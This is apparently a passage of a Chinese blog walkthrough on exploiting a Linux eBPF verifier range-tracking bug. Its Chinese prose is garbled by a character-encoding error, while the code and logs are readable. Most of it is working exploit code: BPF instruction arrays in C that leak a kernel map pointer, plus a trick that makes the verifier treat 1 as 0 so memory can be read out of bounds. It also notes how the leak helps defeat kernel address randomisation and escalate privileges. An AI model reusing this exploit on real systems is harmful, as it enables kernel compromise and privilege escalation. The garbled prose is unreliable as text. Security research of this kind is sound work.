<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ $ ./exp</span><br><span class="line"><span class="meta prompt_">func#</span><span class="language-bash">0 @0</span></span><br><span class="line">0: R1=ctx(off=0,imm=0) R10=fp0</span><br><span class="line">0: (7a) *(u64 *)(r10 -8) = 0          ; R10=fp0 fp-8_w=mmmmmmmm</span><br><span class="line">1: (18) r1 = 0x0                      ; R1_w=map_ptr(off=0,ks=4,vs=8,imm=0)</span><br><span class="line">3: (bf) r2 = r10                      ; R2_w=fp0 R10=fp0</span><br><span class="line">4: (07) r2 += -8                      ; R2_w=fp-8</span><br><span class="line">5: (85) call bpf_map_lookup_elem#1    ; R0_w=map_value_or_null(id=1,off=0,ks=4,vs=8,imm=0)</span><br><span class="line">6: (55) if r0 != 0x0 goto pc+1        ; R0_w=P0</span><br><span class="line">7: (95) exit</span><br><span class="line"></span><br><span class="line">from 6 to 8: R0=map_value(off=0,ks=4,vs=8,imm=0) R10=fp0 fp-8=mmmmmmmm</span><br><span class="line">8: (79) r1 = *(u64 *)(r0 +0)          ; R0=map_value(off=0,ks=4,vs=8,imm=0) R1_w=Pscalar()</span><br><span class="line">9: (77) r1 &gt;&gt;= 32                     ; R1_w=Pscalar(umax=4294967295,var_off=(0x0; 0xffffffff))</span><br><span class="line">10: (67) r1 &lt;&lt;= 32                    ; R1_w=Pscalar(smax=9223372032559808512,umax=18446744069414584320,var_off=(0x0; 0xffffffff00000000),s32_min=0,s32_max=0,u32_max=0)</span><br><span class="line">11: (b7) r2 = -2                      ; R2_w=P-2</span><br><span class="line">12: (67) r2 &lt;&lt;= 32                    ; R2_w=P-8589934592</span><br><span class="line">13: (07) r2 += 1                      ; R2_w=P-8589934591</span><br><span class="line">14: (4f) r1 |= r2                     ; R1_w=Pscalar(umin=18446744065119617025,umax=18446744069414584321,var_off=(0xfffffffe00000001; 0x100000000),s32_min=1,s32_max=0,u32_min=1,u32_max=0) R2_w=P-8589934591</span><br><span class="line">15: (b7) r0 = 0                       ; R0_w=P0</span><br><span class="line">16: (95) exit</span><br><span class="line">processed 16 insns (limit 1000000) max_states_per_insn 0 total_states 1 peak_states 1 mark_read 1</span><br></pre></td></tr></table></figure>

<p>ç¬¬åå››æ¡æŒ‡ä»¤è¿è¡Œå®Œï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">s32_min=<span class="number">1</span>,s32_max=<span class="number">0</span>,u32_min=<span class="number">1</span>,u32_max=<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å°è¯äº†å‰é¢çš„åˆ†æï¼Œå‡ºç°äº†<strong>æœ‰é—®é¢˜çš„èŒƒå›´è·Ÿè¸ª</strong>ã€‚</p>
<h2 id="åœ°å€æ³„éœ²"><a href="#åœ°å€æ³„éœ²" class="headerlink" title="åœ°å€æ³„éœ²"></a>åœ°å€æ³„éœ²</h2><p>å¦‚æœåƒå‰é¢æåˆ°çš„é‚£æ ·ï¼Œåˆ›å»ºäº† min_value &gt; max_value çš„æ¡ä»¶ï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥åˆ©ç”¨å®ƒã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬æŠŠå®ƒç”¨äºæ˜ å°„ä¸­çš„åœ°å€æ³„æ¼ã€‚</p>
<p>åœ¨ eBPF ä¸­å…è®¸å¯¹æ ‡é‡å€¼è¿›è¡ŒåŠ å‡ï¼Œä¹Ÿå…è®¸å¯¹æŒ‡é’ˆè¿›è¡ŒåŠ å‡ã€‚ å¯¹æŒ‡é’ˆå’Œæ ‡é‡å€¼çš„æ“ä½œä¸­çš„åç§»æ›´æ–°æ˜¯åœ¨<a href="https://elixir.bootlin.com/linux/v5.18.14/source/kernel/bpf/verifier.c#L7480"><code>adjust_ptr_min_max_vals</code></a> ä¸­å®ç°çš„ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">adjust_ptr_min_max_vals</span><span class="params">(<span class="keyword">struct</span> bpf_verifier_env *env,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> bpf_insn *insn,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *ptr_reg,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> bpf_reg_state *off_reg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> known = tnum_is_const(off_reg-&gt;var_off);</span><br><span class="line">	s64 smin_val = off_reg-&gt;smin_value, smax_val = off_reg-&gt;smax_value,</span><br><span class="line">	    smin_ptr = ptr_reg-&gt;smin_value, smax_ptr = ptr_reg-&gt;smax_value;</span><br><span class="line">	u64 umin_val = off_reg-&gt;umin_value, umax_val = off_reg-&gt;umax_value,</span><br><span class="line">	    umin_ptr = ptr_reg-&gt;umin_value, umax_ptr = ptr_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((known &amp;&amp; (smin_val != smax_val || umin_val != umax_val)) ||</span><br><span class="line">		smin_val &gt; smax_val || umin_val &gt; umax_val) &#123;</span><br><span class="line">		<span class="comment">/* Taint dst register if offset had invalid bounds derived from</span></span><br><span class="line"><span class="comment">		 * e.g. dead branches.</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		__mark_reg_unknown(env, dst_reg);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„ä»£ç æ˜¾ç¤ºï¼Œåœ¨æ ‡é‡å€¼æ–¹é¢çš„è·Ÿè¸ªè¢«ç ´åçš„æƒ…å†µä¸‹ï¼Œå°±åƒæœ¬ä¾‹ä¸€æ ·ï¼Œ<strong>è®¡ç®—ç»“æœè¢« <code>__mark_reg_unknown</code> å˜æˆäº†æœªçŸ¥çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ æŠŠä¸€ä¸ªæŒ‡é’ˆåŠ åˆ°ä¸€ä¸ªæœ‰è·Ÿè¸ªç ´åçš„å¯„å­˜å™¨ä¸Šï¼Œè®¡ç®—çš„ç»“æœä¼šè¢«å½“ä½œä¸€ä¸ªæ ‡é‡å€¼æ¥å¤„ç†ã€‚æ ‡é‡å€¼å¯ä»¥å†™å…¥ BPF æ˜ å°„ï¼Œä»¥æ­¤æ¥è¿›è¡Œåœ°å€æ³„éœ²ã€‚</strong>è®©æˆ‘ä»¬ç”¨ <code>map_lookup_elem</code> è·å¾—çš„ BPF æ˜ å°„çš„æŒ‡é’ˆæ³„æ¼ã€‚</p>
<p>ä¹‹å‰ç ´åäº†å¯¹ <code>s32_min_value</code> ç­‰çš„æ¨æµ‹ã€‚ä½†æ˜¯ä¸Šé¢çš„ä»£ç éœ€è¦ç ´å 64 ä½çš„å¯„å­˜å™¨ï¼Œå¦‚ smin_valã€‚è¦æŠŠä¸€ä¸ªå¯¹ 32 ä½å€¼çš„ä¸å‡†ç¡®æ¨æµ‹æ‰©å±•ä¸º 64 ä½å€¼çš„ä¸å‡†ç¡®æ¨æµ‹ï¼Œåªéœ€ä½¿ç”¨ BPF_MOV32_REG æŠŠå®ƒå¤åˆ¶åˆ°ä¸€ä¸ª 32 ä½çš„å¯„å­˜å™¨ä¸­ï¼Œå°±åƒåœ¨ x86-64 ä¸­ä¸€æ ·ï¼ˆæ²¡å¤ªç†è§£ä»€ä¹ˆæ„æ€ï¼Œåæ­£å°±ç…§åšäº†ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xFFFFFFFE</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; scalar</span></span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_1),</span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attr</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">    .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(insns[<span class="number">0</span>]),</span><br><span class="line">    .insns = (<span class="type">uint64_t</span>)insns,</span><br><span class="line">    .license = (<span class="type">uint64_t</span>)<span class="string">&quot;GPL v2&quot;</span>,</span><br><span class="line">    .log_level = <span class="number">2</span>,</span><br><span class="line">    .log_size = <span class="keyword">sizeof</span>(verifier_log),</span><br><span class="line">    .log_buf = (<span class="type">uint64_t</span>)verifier_log,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> progfd = bpf(BPF_PROG_LOAD, &amp;prog_attr);</span><br><span class="line"><span class="keyword">if</span> (progfd == <span class="number">-1</span>) fatal(<span class="string">&quot;[-] bpf(BPF_PROG_LOAD)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> socks[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks)) </span><br><span class="line">    fatal(<span class="string">&quot;socketpair&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(<span class="type">int</span>)))</span><br><span class="line">    fatal(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line"></span><br><span class="line">write(socks[<span class="number">1</span>], <span class="string">&quot;Hello&quot;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, verifier_log);</span><br><span class="line"></span><br><span class="line">val = <span class="number">0</span>;</span><br><span class="line">map_lookup(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, val);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœèƒ½æˆåŠŸæ³„éœ²åœ°å€ï¼Œåˆ™å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ³¨æ„ R1 ä¸­åŸæœ¬æœ‰ä¸ª 1ï¼Œæ‰€ä»¥æ³„éœ²çš„æŒ‡é’ˆå€¼åŠ äº† 1ï¼š</p>
<p><img src="/img/ebpf-12-10/1-1.png"></p>
<p>è¿™ä¸ªåœ°å€æ˜¾ç¤ºï¼Œå®ƒæ­£ç¡®åœ°åŒ…å«äº†æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆæ³„éœ²çš„æ•°æ®ï¼‰ï¼š</p>
<p><img src="/img/ebpf-12-10/1-4.png"></p>
<details class="note "><summary><p>è°ƒè¯•æ–¹å¼</p>
</summary>
<p>å¾…è°ƒè¯•çš„è¿›ç¨‹ç”¨ getchar() æŒ‚ä½ï¼Œgdb ç›´æ¥ <code>target remote localhost:port</code> å³å¯ã€‚</p>

</details>

<p>-0x110 æ˜¯æ‰¾åˆ°å¸¦æœ‰æ•°æ®çš„ BPF æ˜ å°„çš„å¼€å§‹ã€‚è¿™æ˜¯å› ä¸º bpf_array ç»“æ„çš„å­˜åœ¨ã€‚<strong>ä¾‹å¦‚æœ€å‰é¢çš„ 0xffffffff81c124a0 å°±æ˜¯ bpf_map ç»“æ„ä¸­çš„å‡½æ•°è¡¨ opsï¼ˆè®°ä½è¿™ä¸ªä¸œè¥¿ï¼Œåé¢æ³„éœ²å†…æ ¸åŸºå€çš„æ—¶å€™å¯ä»¥ç”¨åˆ°ï¼‰</strong>ã€‚è™½ç„¶åœ¨è¿™ç§æƒ…å†µä¸‹æ²¡æœ‰ä½¿ç”¨ï¼Œä½† eBPF æ”»å‡»è¿˜åŒ…æ‹¬ä¸€ç§é‡å†™è¿™ä¸ª ops çš„æ–¹æ³•ï¼Œä»¥æå‡æƒé™ã€‚ä¿ç•™ BPF æ˜ å°„çš„åœ°å€ï¼Œå› ä¸ºå®ƒä½¿éšåçš„ kASLR æ³„æ¼æ›´å®¹æ˜“ã€‚ å¦‚æœæŠŠå®ƒå˜æˆä¸€ä¸ªå‡½æ•°ï¼Œè¿™æ ·å½“ä½ ä¼ é€’ map çš„ fdï¼ˆç»“å°¾å¤„å‡å»1ï¼‰æ—¶ï¼Œå®ƒå°±ä¼šè¿”å›åœ°å€ï¼Œè¿™æ ·çš„ä»£ç å°±æ¯”è¾ƒå¹²å‡€ã€‚</p>
<details class="note "><summary><p>bpf_map ç»“æ„ä½“</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">	<span class="comment">/* The first two cachelines with read-mostly members of which some</span></span><br><span class="line"><span class="comment">	 * are also accessed in fast-path (e.g. ops, max_entries).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span> ____<span class="title">cacheline_aligned</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">inner_map_meta</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span> *security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span> <span class="title">map_type</span>;</span></span><br><span class="line">	u32 key_size;</span><br><span class="line">	u32 value_size;</span><br><span class="line">	u32 max_entries;</span><br><span class="line">	u64 map_extra; <span class="comment">/* any per-map-type extra fields */</span></span><br><span class="line">	u32 map_flags;</span><br><span class="line">	<span class="type">int</span> spin_lock_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">	<span class="type">int</span> timer_off; <span class="comment">/* &gt;=0 valid offset, &lt;0 error */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="type">int</span> numa_node;</span><br><span class="line">	u32 btf_key_type_id;</span><br><span class="line">	u32 btf_value_type_id;</span><br><span class="line">	u32 btf_vmlinux_value_type_id;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG_KMEM</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">char</span> name[BPF_OBJ_NAME_LEN];</span><br><span class="line">	<span class="type">bool</span> bypass_spec_v1;</span><br><span class="line">	<span class="type">bool</span> frozen; <span class="comment">/* write-once; write-protected by freeze_mutex */</span></span><br><span class="line">	<span class="comment">/* 14 bytes hole */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The 3rd and 4th cacheline with misc members to avoid false sharing</span></span><br><span class="line"><span class="comment">	 * particularly with refcounting.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">atomic64_t</span> refcnt ____cacheline_aligned;</span><br><span class="line">	<span class="type">atomic64_t</span> usercnt;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">freeze_mutex</span>;</span></span><br><span class="line">	<span class="type">atomic64_t</span> writecnt;</span><br><span class="line">	<span class="comment">/* &#x27;Ownership&#x27; of program-containing map is claimed by the first program</span></span><br><span class="line"><span class="comment">	 * that is going to use this map or by the first program which FD is</span></span><br><span class="line"><span class="comment">	 * stored in the map to make sure that all callers and callees have the</span></span><br><span class="line"><span class="comment">	 * same prog type, JITed flag and xdp_has_frags flag.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">spinlock_t</span> lock;</span><br><span class="line">		<span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> <span class="title">type</span>;</span></span><br><span class="line">		<span class="type">bool</span> jited;</span><br><span class="line">		<span class="type">bool</span> xdp_has_frags;</span><br><span class="line">	&#125; owner;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</details>



<h2 id="root-æµ‹è¯•-oob"><a href="#root-æµ‹è¯•-oob" class="headerlink" title="root æµ‹è¯• oob"></a>root æµ‹è¯• oob</h2><p>æ­£å¦‚å‰æ–‡æåˆ°çš„ï¼ŒALU sanitation çš„ç¼“è§£æœºåˆ¶ä½¿å¾—ä¸èƒ½åƒä»¥å‰é‚£æ ·ç®€å•çš„ oob åˆ©ç”¨ã€‚</p>
<p>äº‹å®ä¸Šå¦‚æœå‡½æ•° <a href="https://elixir.bootlin.com/linux/v5.18.14/source/include/linux/bpf.h#L1469"><code>bpf_bypass_spec_v1</code></a> å‡½æ•°è¿”å› trueï¼Œåˆ™ä¼šç»•è¿‡ ALU sanitationã€‚è¿™ä¸ªå‡½æ•°å¯¹ root æƒé™è¿”å›çœŸï¼Œæ‰€ä»¥ä½ ä»ç„¶å¯ä»¥ç”¨ root æƒé™å°è¯•è¶…å‡ºèŒƒå›´çš„å¼•ç”¨ã€‚</p>
<p><img src="/img/ebpf-12-10/1-2.png"></p>
<p>å› æ­¤ï¼Œè®©æˆ‘ä»¬é¦–å…ˆå°è¯•ç”¨ root æƒé™åšä¸€ä¸ªâ€ç®€å•çš„â€èŒƒå›´å¤–çš„å¼•ç”¨ã€‚</p>
<h3 id="ç ´åè·Ÿè¸ªèŒƒå›´ä»¥åˆ›é€ ä¸€ä¸ªå¸¸é‡"><a href="#ç ´åè·Ÿè¸ªèŒƒå›´ä»¥åˆ›é€ ä¸€ä¸ªå¸¸é‡" class="headerlink" title="ç ´åè·Ÿè¸ªèŒƒå›´ä»¥åˆ›é€ ä¸€ä¸ªå¸¸é‡"></a>ç ´åè·Ÿè¸ªèŒƒå›´ä»¥åˆ›é€ ä¸€ä¸ªå¸¸é‡</h3><p>åˆ©ç”¨ verifier é”™è¯¯çš„ä¸€ä¸ªæ–¹ä¾¿çš„æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªå¸¸æ•°ï¼ˆXXï¼&#x3D;Yï¼‰ï¼Œverifier è®¤ä¸ºæ˜¯ Xï¼Œä½†å®é™…ä¸Šæ˜¯ Yã€‚ ç‰¹åˆ«æ˜¯ï¼Œå½“X&#x3D;0,Y!&#x3D;0 æ—¶ï¼Œä¸ºè¶…å‡ºèŒƒå›´çš„å¼•ç”¨åˆ›å»ºåç§»é‡æ˜¯å¾ˆæ–¹ä¾¿çš„ï¼Œå› ä¸ºæ— è®ºå®ƒè¢«ä¹˜ä»¥ä»€ä¹ˆï¼Œverifier éƒ½åˆ¤æ–­å®ƒæ˜¯0ã€‚</p>
<p>é¦–å…ˆï¼Œè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª â€œéªŒè¯è€…è®¤ä¸ºæ˜¯ 0 ä½†å®é™…ä¸Šæ˜¯ 1 çš„å¸¸æ•°â€ã€‚ç°åœ¨ R1 çš„ u32_min_valueä¸º1ï¼Œu32_max_value ä¸º0ã€‚ç›¸åï¼Œåœ¨R2ä¸­æ”¾ä¸€ä¸ªå€¼ï¼Œå…¶ä¸­ u32_min_value ä¸º 0ï¼Œu32_max_value ä¸º 1ï¼ˆä¸ç ´åè·Ÿè¸ªï¼‰ã€‚ç°åœ¨è€ƒè™‘ R1 å’Œ R2 çš„ç›¸åŠ ï¼Œæˆ‘ä»¬çœ‹åˆ°èŒƒå›´æ˜¯ [1,0] + [0,1] &#x3D; [1,1]ã€‚å…·æœ‰ç›¸åŒæœ€å°å€¼å’Œæœ€å¤§å€¼çš„å¯„å­˜å™¨åœ¨ MOV å’Œå…¶ä»–æ“ä½œä¸‹è¢«è§†ä¸ºå¸¸æ•°ï¼ŒR1 çš„å®é™…å€¼ä¸º 1ï¼Œè€Œ R2 å– 0 æˆ– 1ã€‚ å› æ­¤ï¼ŒåŠ æ³•çš„ç»“æœå¿…é¡»æ˜¯ [1,2]ã€‚ ç„¶è€Œï¼Œverifier åˆ¤æ–­åŠ æ³•åçš„ R1 æ˜¯ä¸€ä¸ªå¸¸æ•° 1ï¼Œè¿™å°±åŒ…æ‹¬äº† R1 çš„å®é™…å€¼æ˜¯ 2 çš„æƒ…å†µã€‚ç„¶åæˆ‘ä»¬å¯ä»¥ä» R1 ä¸­å‡å» 1ï¼Œä»¥äº§ç”Ÿæ‰€éœ€çš„ â€œverifier è®¤ä¸ºæ˜¯ 0 ä½†å®é™…ä¸Šæ˜¯ 1 çš„å¸¸æ•°â€ã€‚</p>
<p>u32_min_value ä¸º 0 å’Œ u32_max_value ä¸º 1 çš„ R2 å¯ä»¥é€šè¿‡ç»“åˆé€»è¾‘å’Œç®—æœ¯è¿ç®—æˆ–åœ¨æ¡ä»¶åˆ†æ”¯ä¸­æ”¾å¼ƒå¤§äº1çš„æƒ…å†µæ¥åˆ›å»ºã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> mapfd = map_create(<span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line"><span class="type">char</span> verifier_log[<span class="number">0x10000</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> val;</span><br><span class="line">val = <span class="number">1</span>;</span><br><span class="line">map_update(mapfd, <span class="number">0</span>, &amp;val);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// R0 =&gt; &amp;map[0]</span></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_FP, <span class="number">-0x08</span>, <span class="number">0</span>), <span class="comment">// key=0</span></span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-8</span>),</span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), <span class="comment">// map_lookup_elem(mapfd, &amp;k)</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; var_off=(value=0; mask=0xffffffff00000000)</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_9, <span class="number">0</span>),	<span class="comment">// reg1=*(u64 *)reg9 reg1=1?</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_RSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, <span class="number">32</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; var_off=(value=0xfffffffe00000001; mask=0)</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0xfffffffe</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_LSH, BPF_REG_2, <span class="number">32</span>),</span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; (s32_min=1, s32_max=0, u32_min=1, u32_max=0)  real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_OR, BPF_REG_1, BPF_REG_2),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R2 --&gt; (s32_min=0, s32_max=1, u32_min=0, u32_max=1)  real:1</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_9, <span class="number">0</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, BPF_REG_2, <span class="number">1</span>, <span class="number">2</span>), <span class="comment">// REG_2 &lt; 1 ? JMP pc+2 : EXIT</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line"></span><br><span class="line">    <span class="comment">// R1 --&gt; 0	 real:1</span></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),</span><br><span class="line">    BPF_MOV32_REG(BPF_REG_1, BPF_REG_1),</span><br><span class="line">    BPF_ALU64_IMM(BPF_SUB, BPF_REG_1, <span class="number">1</span>),</span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_1, <span class="number">-0x10</span>),</span><br><span class="line">    BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP), </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, <span class="number">-0x08</span>), <span class="comment">// key</span></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),    </span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, <span class="number">-0x10</span>), <span class="comment">// value</span></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_ARG4, <span class="number">0</span>),              <span class="comment">// flags</span></span><br><span class="line">    BPF_EMIT_CALL(BPF_FUNC_map_update_elem),</span><br><span class="line"></span><br><span class="line">    BPF_MOV64_REG(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„æŒ‡ä»¤å¯ä»¥å®Œæˆè¯»å‡ºå®é™… r1 çœŸæ­£å€¼çš„æ“ä½œã€‚æœ€ç»ˆ map_lookup çš„æ—¶å€™è¿”å› 1ã€‚</p>
<p><img src="/img/ebpf-12-10/1-3.png"></p>
